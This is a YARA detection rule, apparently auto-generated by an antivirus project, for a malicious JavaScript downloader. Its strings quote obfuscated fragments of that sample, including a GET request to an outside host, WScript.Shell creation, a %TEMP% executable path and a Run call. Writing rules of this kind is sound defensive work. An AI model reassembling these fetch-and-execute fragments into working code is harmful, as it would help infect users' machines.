rule sig_20160330_975098b7167d4d6b8a681d848566122f {
  meta:
    description = "datamaliciousorder - file 20160330_975098b7167d4d6b8a681d848566122f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d67cb765a5979eac142c67d34f0bf2b0a4670dfb7c73848fcb3eb785fb5d17f2"

  strings:
    $s1  = "_HA[_IQ](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "function _U(_H1, _A0){_MP = _MP * 1; return _H1 - _A0;};" fullword ascii
    $s3  = "var _H0 = function _UU() {return WScript[_LS](\"WScript\"+\".Shell\");}(), _DJ = 11;" fullword ascii
    $s4  = "if (_HA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _A() {return _H0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"d57tobPYcqqOSa.ex\" + \"e\";};" fullword ascii
    $s6  = "function _N(){return _JQ + \"\";};" fullword ascii
    $s7  = "function _WT(_U0){_H0[\"Run\"](_U0, _MP, _MP);};" fullword ascii
    $s8  = "function _Z() {return ((_Z0 == true) && (_Z0 == _GQ)) ? 1 : _MP;};" fullword ascii
    $s9  = "function _K()" fullword ascii
    $s10 = "var _UQ = new this[\"Date\"]();" fullword ascii
    $s11 = "return _U(_O, _WI);" fullword ascii
    $s12 = "function _P(){return _LS;};" fullword ascii
    $s13 = "function _WE(){return 22;};" fullword ascii
    $s14 = "function _VS(_IX) {var _KS = (1, 2, 3, 4, 5, _IX); return _KS;};" fullword ascii
    $s15 = " while (_H){" fullword ascii
    $s16 = "_Z0 = true; " fullword ascii
    $s17 = "var _Z0 = false;" fullword ascii
    $s18 = "var _GQ = false;" fullword ascii
    $s19 = "_GQ = true; " fullword ascii
    $s20 = "var _JJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}